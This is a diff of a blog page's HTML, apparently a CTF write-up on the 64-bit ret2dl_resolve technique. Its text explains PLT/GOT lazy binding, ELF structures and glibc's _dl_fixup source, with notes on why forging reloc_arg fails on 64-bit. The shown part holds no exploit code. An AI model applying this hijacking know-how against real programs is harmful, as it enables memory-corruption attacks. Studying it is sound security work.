@@ -126,7 +126,7 @@
 <meta property="og:image" content="https://s1.ax1x.com/2020/06/13/tvAyvD.png">
 <meta property="og:image" content="https://s1.ax1x.com/2020/06/13/tvAWVA.png">
 <meta property="article:published_time" content="2020-06-10T15:14:48.000Z">
-<meta property="article:modified_time" content="2020-06-14T17:49:39.905Z">
+<meta property="article:modified_time" content="2020-06-14T18:06:54.720Z">
 <meta property="article:author" content="Paxos">
 <meta property="article:tag" content="ret2dl_resolve">
 <meta name="twitter:card" content="summary">
@@ -405,35 +405,13 @@
         <p><del>当时没做出来的一道题，赛后再静下心研究一下，ret2dl 64位模版题，一瞬把我秒了。。</del></p>
 <h2 id="什么是ret2dl攻击"><a href="#什么是ret2dl攻击" class="headerlink" title="什么是ret2dl攻击"></a>什么是ret2dl攻击</h2><ul>
 <li>当程序在第一次加载某个函数的时候，got表中对应的表项还没有写入真实的地址（因为是第一次调用），所以这个时候就需要调用<code>_dl_runtime_resolve</code>函数将真实的地址写入got表对应的表项中，然后将控制权交还这个函数，此时就完成了第一次的调用，got表中也有了对应的真实地址。<h2 id="整个调用过程梳理"><a href="#整个调用过程梳理" class="headerlink" title="整个调用过程梳理"></a>整个调用过程梳理</h2><h3 id="dl-fixup之前"><a href="#dl-fixup之前" class="headerlink" title="_dl_fixup之前"></a>_dl_fixup之前</h3></li>
-<li>当我们第一调用read时，他的跳转过程是<code>read@plt -&gt; read@got -&gt; read@plt -&gt; plt[0] -&gt; _dl_runtime_resolve_xsave -&gt; _dl_fixup</code><img src="https://s1.ax1x.com/2020/06/10/t70ca8.png" srcset="/img/loading.gif" alt="">)我们可以再看一下0x4004e0到底是什么。<img src="https://s1.ax1x.com/2020/06/10/t70LiF.png" srcset="/img/loading.gif" alt="">已知 &lt;read@plt&gt;  是plt中的第一个函数，那么0x4004e0就是plt[0]即plt的首项。这里对应两条汇编，第一条实际上做了一个push操作，他负责将一个参数压栈。这里需要实际解释一下：在<code>_dl_runtime_resolve_xsave</code>中实际调用了<code>_dl_fixup</code>而忽略掉宏定义，这个函数是:  <pre><code class="hljs c"><span class="hljs-comment">/* This function is called through a special trampoline from the PLT the</span>
-<span class="hljs-comment">first time each PLT entry is called.  We must perform the relocation</span>
-<span class="hljs-comment">specified in the PLT of the given shared object, and return the resolved</span>
-<span class="hljs-comment">function address to the trampoline, which will restart the original call</span>
-<span class="hljs-comment">to that address.  Future calls will bounce directly from the PLT to the</span>
-<span class="hljs-comment">function.  */</span>
-
-DL_FIXUP_VALUE_TYPE
-attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
-_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</code></pre>
+<li>当我们第一调用read时，他的跳转过程是<code>read@plt -&gt; read@got -&gt; read@plt -&gt; plt[0] -&gt; _dl_runtime_resolve_xsave -&gt; _dl_fixup</code><img src="https://s1.ax1x.com/2020/06/10/t70ca8.png" alt="">)我们可以再看一下0x4004e0到底是什么。<img src="https://s1.ax1x.com/2020/06/10/t70LiF.png" alt="">已知 &lt;read@plt&gt;  是plt中的第一个函数，那么0x4004e0就是plt[0]即plt的首项。这里对应两条汇编，第一条实际上做了一个push操作，他负责将一个参数压栈。这里需要实际解释一下：在<code>_dl_runtime_resolve_xsave</code>中实际调用了<code>_dl_fixup</code>而忽略掉宏定义，这个函数是:  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">first time each PLT entry is called.  We must perform the relocation</span></span><br><span class="line"><span class="comment">specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">to that address.  Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">function.  */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p>可以看到一共有两个参数：<code>struct link_map *l, ElfW(Word) reloc_arg</code>，然后我们再回过来看刚刚的代码，<strong>其实两个push就是做了参数压栈</strong>：<img src="https://s1.ax1x.com/2020/06/10/t7DzE6.png" srcset="/img/loading.gif" alt=""></p>
+<p>可以看到一共有两个参数：<code>struct link_map *l, ElfW(Word) reloc_arg</code>，然后我们再回过来看刚刚的代码，<strong>其实两个push就是做了参数压栈</strong>：<img src="https://s1.ax1x.com/2020/06/10/t7DzE6.png" alt=""></p>
 <h3 id="dl-fixup进入以后"><a href="#dl-fixup进入以后" class="headerlink" title="_dl_fixup进入以后"></a>_dl_fixup进入以后</h3><ul>
-<li>嗯这、这里是关键，我们一步步分析一下<code>_dl_fixup</code>源代码。在这之前，我们先要研究一下几个重要的section和段。<h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><img src="https://s1.ax1x.com/2020/06/11/t7sey9.png" srcset="/img/loading.gif" alt="">.dynamic是动态链接中非常重要和经典的一个段。首先看一下<code>ELF64_Dyn</code>的结构如下：<pre><code class="hljs c"><span class="hljs-comment">// 该结构都有 64 位程序和 32 位程序的区别，不过大致结构相似，此处只讨论 64 位程序中的</span>
-<span class="hljs-comment">// /usr/include/elf.h</span>
-<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span>
-<span class="hljs-class">&#123;</span>
-Elf64_Sxword d_tag; <span class="hljs-comment">/* Dynamic entry type */</span>
-<span class="hljs-comment">// d_tag 识别该结构体表示的哪一个节，通过以此字段不同来寻找不同的节</span>
-    <span class="hljs-keyword">union</span>
-    &#123;
-        Elf64_Xword d_val; <span class="hljs-comment">/* Integer value */</span>
-        <span class="hljs-comment">// 对应节的地址，用于存储该结构体表示下的节所在的地址</span>
-        Elf64_Addr d_ptr; <span class="hljs-comment">/* Address value */</span>
-    &#125; d_un;
-
-&#125; Elf64_Dyn;</code></pre>
+<li>嗯这、这里是关键，我们一步步分析一下<code>_dl_fixup</code>源代码。在这之前，我们先要研究一下几个重要的section和段。<h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><img src="https://s1.ax1x.com/2020/06/11/t7sey9.png" alt="">.dynamic是动态链接中非常重要和经典的一个段。首先看一下<code>ELF64_Dyn</code>的结构如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该结构都有 64 位程序和 32 位程序的区别，不过大致结构相似，此处只讨论 64 位程序中的</span></span><br><span class="line"><span class="comment">// /usr/include/elf.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword d_tag; <span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="comment">// d_tag 识别该结构体表示的哪一个节，通过以此字段不同来寻找不同的节</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        Elf64_Xword d_val; <span class="comment">/* Integer value */</span></span><br><span class="line">        <span class="comment">// 对应节的地址，用于存储该结构体表示下的节所在的地址</span></span><br><span class="line">        Elf64_Addr d_ptr; <span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line"></span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
 而在.dynamic之中有几个<strong>重要的section如下</strong>：<table>
 <thead>
 <tr>
@@ -460,205 +438,21 @@ Elf64_Sxword d_tag; <span class="hljs-comment">/* Dynamic entry type */</span>
 </tbody></table>
 </li>
 </ul>
-<h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><p><img src="https://s1.ax1x.com/2020/06/11/t76sqs.png" srcset="/img/loading.gif" alt=""><br>其中，ELF64_Sym结构体为：</p>
-<pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span>
-<span class="hljs-class">&#123;</span>
-Elf64_Word st_name; <span class="hljs-comment">/* Symbol name (string tbl index) */</span>
-<span class="hljs-comment">// 保存着该函数函数名在 .dynstr 中的偏移，可以结合 .dynstr 找到准确函数名。</span>
-<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_info; <span class="hljs-comment">/* Symbol type and binding */</span>
-<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> st_other; <span class="hljs-comment">/* Symbol visibility */</span>
-Elf64_Section st_shndx; <span class="hljs-comment">/* Section index */</span>
-Elf64_Addr st_value; <span class="hljs-comment">/* Symbol value */</span>
-<span class="hljs-comment">// 如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL.</span>
-Elf64_Xword st_size; <span class="hljs-comment">/* Symbol size */</span>
-&#125; Elf64_Sym;</code></pre>
-<h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h4><p><img src="https://s1.ax1x.com/2020/06/11/t76hzF.png" srcset="/img/loading.gif" alt=""></p>
-<h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><p><img src="https://s1.ax1x.com/2020/06/11/t7gFB9.png" srcset="/img/loading.gif" alt=""><br>其中，ELF64_Rela结构体为：</p>
-<pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span>
-           Elf64_Addr r_offset; <span class="hljs-comment">//保存的是应用重定位操作的偏移量。对于一个重定位文件，这个值是从节开始到受重定位影响的存储单元的偏移量。对于一个可执行或共享目标文件，这个值是受重定位影响的存储单元的虚拟地址。</span>
-           <span class="hljs-keyword">uint64_t</span>   r_info;   <span class="hljs-comment">//This member gives both the symbol table index with respect to which the relocation must be made and the type of relocation to apply. </span>
-           <span class="hljs-keyword">int64_t</span>    r_addend; <span class="hljs-comment">//指定了一个附加的常数用来去计算保存在重定位位置的值。</span>
-       &#125; Elf64_Rela;</code></pre>
-<h4 id="link-map结构"><a href="#link-map结构" class="headerlink" title="link_map结构"></a>link_map结构</h4><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span></span>
-<span class="hljs-class">  &#123;</span>
-    ElfW(Addr) l_addr;                <span class="hljs-comment">/* Base address shared object is loaded at.  */</span>
-    <span class="hljs-keyword">char</span> *l_name;                     <span class="hljs-comment">/* Absolute file name object was found in.  */</span>
-    ElfW(Dyn) *l_ld;                  <span class="hljs-comment">/* Dynamic section of the shared object.  */</span>
-    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>, *<span class="hljs-title">l_prev</span>;</span> <span class="hljs-comment">/* Chain of loaded objects.  */</span>
-    <span class="hljs-comment">//省略，后面还有很多</span>
-  &#125;;</code></pre>
-<h4 id="D-PTR宏"><a href="#D-PTR宏" class="headerlink" title="D_PTR宏"></a>D_PTR宏</h4><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> DL_RO_DYN_SECTION</span>
-<span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
-<span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span></code></pre>
+<h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><p><img src="https://s1.ax1x.com/2020/06/11/t76sqs.png" alt=""><br>其中，ELF64_Sym结构体为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="comment">// 保存着该函数函数名在 .dynstr 中的偏移，可以结合 .dynstr 找到准确函数名。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf64_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">Elf64_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line"><span class="comment">// 如果这个符号被导出，则存有这个导出函数的虚拟地址，否则为NULL.</span></span><br><span class="line">Elf64_Xword st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>
+<h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h4><p><img src="https://s1.ax1x.com/2020/06/11/t76hzF.png" alt=""></p>
+<h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><p><img src="https://s1.ax1x.com/2020/06/11/t7gFB9.png" alt=""><br>其中，ELF64_Rela结构体为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">           Elf64_Addr r_offset; <span class="comment">//保存的是应用重定位操作的偏移量。对于一个重定位文件，这个值是从节开始到受重定位影响的存储单元的偏移量。对于一个可执行或共享目标文件，这个值是受重定位影响的存储单元的虚拟地址。</span></span><br><span class="line">           <span class="keyword">uint64_t</span>   r_info;   <span class="comment">//This member gives both the symbol table index with respect to which the relocation must be made and the type of relocation to apply. </span></span><br><span class="line">           <span class="keyword">int64_t</span>    r_addend; <span class="comment">//指定了一个附加的常数用来去计算保存在重定位位置的值。</span></span><br><span class="line">       &#125; Elf64_Rela;</span><br></pre></td></tr></table></figure>
+<h4 id="link-map结构"><a href="#link-map结构" class="headerlink" title="link_map结构"></a>link_map结构</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;                <span class="comment">/* Base address shared object is loaded at.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;                     <span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;                  <span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">    <span class="comment">//省略，后面还有很多</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+<h4 id="D-PTR宏"><a href="#D-PTR宏" class="headerlink" title="D_PTR宏"></a>D_PTR宏</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DL_RO_DYN_SECTION</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
 
-<h4 id="ELFW宏"><a href="#ELFW宏" class="headerlink" title="ELFW宏"></a>ELFW宏</h4><pre><code class="hljs c"><span class="hljs-comment">/* We use this macro to refer to ELF macros independent of the native</span>
-<span class="hljs-comment">   wordsize.  `ELFW(R_TYPE)' is used in place of `ELF32_R_TYPE' or</span>
-<span class="hljs-comment">   `ELF64_R_TYPE'.  */</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELFW(type)	_ElfW (ELF, __ELF_NATIVE_CLASS, type)</span></code></pre>
-<h4 id="DL-FIXUP-MAKE-VALUE宏"><a href="#DL-FIXUP-MAKE-VALUE宏" class="headerlink" title="DL_FIXUP_MAKE_VALUE宏"></a>DL_FIXUP_MAKE_VALUE宏</h4><pre><code class="hljs c"><span class="hljs-comment">/* Construct a value of type DL_FIXUP_VALUE_TYPE from a code address</span>
-<span class="hljs-comment">   and a link map.  */</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DL_FIXUP_MAKE_VALUE(map, addr) (addr)</span></code></pre>
-<h4 id="SYMBOL-ADDRESS宏"><a href="#SYMBOL-ADDRESS宏" class="headerlink" title="SYMBOL_ADDRESS宏"></a>SYMBOL_ADDRESS宏</h4><pre><code class="hljs c"><span class="hljs-comment">/* Calculate the address of symbol REF using the base address from map MAP,</span>
-<span class="hljs-comment">   if non-NULL.  Don't check for NULL map if MAP_SET is TRUE.  */</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYMBOL_ADDRESS(map, ref, map_set)				\</span>
-  ((ref) == <span class="hljs-literal">NULL</span> ? <span class="hljs-number">0</span>							\
-   : (__glibc_unlikely ((ref)-&gt;st_shndx == SHN_ABS) ? <span class="hljs-number">0</span>			\
-      : LOOKUP_VALUE_ADDRESS (<span class="hljs-built_in">map</span>, map_set)) + (ref)-&gt;st_value)</code></pre>
-<h4 id="LOOKUP-VALUE-ADDRESS宏"><a href="#LOOKUP-VALUE-ADDRESS宏" class="headerlink" title="LOOKUP_VALUE_ADDRESS宏"></a>LOOKUP_VALUE_ADDRESS宏</h4><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOOKUP_VALUE_ADDRESS(map, set) ((set) || (map) ? (map)-&gt;l_addr : 0)</span></code></pre>
-<h4 id="elf-machine-fixup-plt函数"><a href="#elf-machine-fixup-plt函数" class="headerlink" title="elf_machine_fixup_plt函数"></a>elf_machine_fixup_plt函数</h4><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Addr)</span></span>
-<span class="hljs-function"><span class="hljs-title">elf_machine_fixup_plt</span> <span class="hljs-params">(struct link_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">lookup_t</span> t,</span></span>
-<span class="hljs-function"><span class="hljs-params">		       <span class="hljs-keyword">const</span> ElfW(Sym) *refsym, <span class="hljs-keyword">const</span> ElfW(Sym) *sym,</span></span>
-<span class="hljs-function"><span class="hljs-params">		       <span class="hljs-keyword">const</span> ElfW(Rela) *reloc,</span></span>
-<span class="hljs-function"><span class="hljs-params">		       ElfW(Addr) *reloc_addr, ElfW(Addr) value)</span></span>
-<span class="hljs-function"></span>&#123;
-  <span class="hljs-keyword">return</span> *reloc_addr = value;
-&#125;</code></pre>
-<h4 id="x86-64下对于reloc-arg的特殊define"><a href="#x86-64下对于reloc-arg的特殊define" class="headerlink" title="x86-64下对于reloc_arg的特殊define"></a>x86-64下对于reloc_arg的特殊define</h4><pre><code class="hljs c"><span class="hljs-comment">/* The ABI calls for the PLT stubs to pass the index of the relocation</span>
-<span class="hljs-comment">   and not its offset.  In _dl_profile_fixup and _dl_call_pltexit we</span>
-<span class="hljs-comment">   also use the index.  Therefore it is wasteful to compute the offset</span>
-<span class="hljs-comment">   in the trampoline just to reverse the operation immediately</span>
-<span class="hljs-comment">   afterwards.  此时的reloc_arg类似于一个数组下标 */</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> reloc_offset reloc_arg * sizeof (PLTREL)</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> reloc_index  reloc_arg</span>
-
-<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;elf/dl-runtime.c&gt;</span></span></code></pre>
-<h4 id="dl-fixup源码阅读"><a href="#dl-fixup源码阅读" class="headerlink" title="_dl_fixup源码阅读"></a>_dl_fixup源码阅读</h4><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span>
-
-<span class="hljs-comment">/*这里由于我们是64位下的，请看：x86-64下对于reloc_arg的特殊define*/</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> reloc_offset</span>
-<span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> reloc_offset reloc_arg</span>
-<span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
-
-DL_FIXUP_VALUE_TYPE
-attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
-_dl_fixup (
-# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
-	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
-# endif
-	   struct link_map *l, ElfW(Word) reloc_arg
-)
-
-&#123;
-  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-keyword">const</span> symtab</span>
-<span class="hljs-function">    </span>= (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  
-    <span class="hljs-comment">//通过指向linkmap找到DT_SYMTAB，进而得到.dynsym地址，存在symtab里。</span>
-    <span class="hljs-comment">//查找过程：l -&gt; linkmap -&gt; DT_SYMTAB -&gt; .dynsym</span>
-    <span class="hljs-comment">//其中l指向linkmap，d_tag类型为DT_SYMTAB时，d_ptr指向.dynsym</span>
-
-  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *strtab 
-   = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);
-    <span class="hljs-comment">//拿到.dynstr地址</span>
-
-  <span class="hljs-keyword">const</span> PLTREL *<span class="hljs-keyword">const</span> reloc
-    = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
-    <span class="hljs-comment">//reloc_offset就是reloc_arg</span>
-    <span class="hljs-comment">//将.rel.plt地址与reloc_offset相加，得到函数所对应的Elf64_Rel指针，记作reloc </span>
-
-  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *sym </span>
-<span class="hljs-function">   </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];
-    <span class="hljs-comment">//将(reloc-&gt;r_info)&gt;&gt;32作为.dynsym下标，得到函数所对应的Elf64_Sym指针，记作sym</span>
-
-
-  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Sym)</span> *refsym </span>= sym;
-  <span class="hljs-keyword">void</span> *<span class="hljs-keyword">const</span> rel_addr = (<span class="hljs-keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);
-    <span class="hljs-comment">//l-&gt;l_addr 加载共享对象的基本地址</span>
-    <span class="hljs-comment">//l-&gt;l_addr + reloc-&gt;r_offset即为需要修改的got表地址。</span>
- 
-
-  <span class="hljs-keyword">lookup_t</span> result;
-  DL_FIXUP_VALUE_TYPE value;
-
-  <span class="hljs-comment">/* Sanity check that we're really looking at a PLT relocation.  */</span>
-  <span class="hljs-comment">/* 检查r_info最低为是不是7 */</span>
-  <span class="hljs-comment">/* ELFW(TYPE)是用来代替 Elf32_TYPE 或 Elf64_TYPE*/</span>
-  <span class="hljs-comment">/* ELF_MACHINE_JMP_SLOT=7 有兴趣可以自己看源码在：glibc/latest/source/elf/elf.h */</span>
-  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);
-
-
-   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span>
-<span class="hljs-comment">      used don't look in the global scope.  */</span>
-      
-  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)   <span class="hljs-comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span>
-    &#123;
-      <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> = <span class="hljs-title">NULL</span>;</span>
-
-      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)
-	&#123;
-	  <span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-title">ElfW</span><span class="hljs-params">(Half)</span> *vernum </span>=
-	    (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
-	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;    
-      <span class="hljs-comment">//64位下没法伪造reloc_arg的原因：(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值容易出现非法内存访问</span>
-      <span class="hljs-comment">//大佬的解释：64位程序bss段被映射到0x600000,我们伪造的.dynsym也在0x600000+,而DT_SYM结构体中的d_ptr还是在0x400000,这就意味着我们的r_info必然很大，再加上数据类型大小的不同，导致(reloc-&gt;r_info)&gt;&gt;32作为vernum下标取值时十分容易访问到0x400000和0x600000之间的不可读区域</span>
-
-      <span class="hljs-comment">/*</span>
-<span class="hljs-comment">      #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)</span>
-<span class="hljs-comment">      #define ELF64_R_TYPE(i)            ((i) &amp; 0xffffffff)</span>
-<span class="hljs-comment">      */</span>
-
-	  version = &amp;l-&gt;l_versions[ndx];
-	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)
-	    version = <span class="hljs-literal">NULL</span>;
-	&#125;
-
-      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span>
-<span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span>
-<span class="hljs-comment">	 we are not using any threads (yet).  */</span>
-      <span class="hljs-keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;
-      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)
-	&#123;
-	  THREAD_GSCOPE_SET_FLAG ();
-	  flags |= DL_LOOKUP_GSCOPE_LOCK;
-	&#125;
-
-<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span>
-      RTLD_ENABLE_FOREIGN_CALL;
-<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
-
-    <span class="hljs-comment">/* 通过 strtab+sym-&gt;st_name 找到函数对应的字符串，result为libc_base */</span>
-      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,
-				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);
-
-      <span class="hljs-comment">/* We are done with the global scope.  */</span>
-      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)
-	THREAD_GSCOPE_RESET_FLAG ();
-
-<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span>
-      RTLD_FINALIZE_FOREIGN_CALL;
-<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>
-
-      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span>
-<span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span>
-<span class="hljs-comment">	 offset.  */</span>
-     <span class="hljs-comment">/* 函数的真实地址 = libc_base(result) + 偏移地址*/</span>
-      value = DL_FIXUP_MAKE_VALUE (result,
-				   SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));
-    &#125;
-  <span class="hljs-keyword">else</span>
-    &#123;
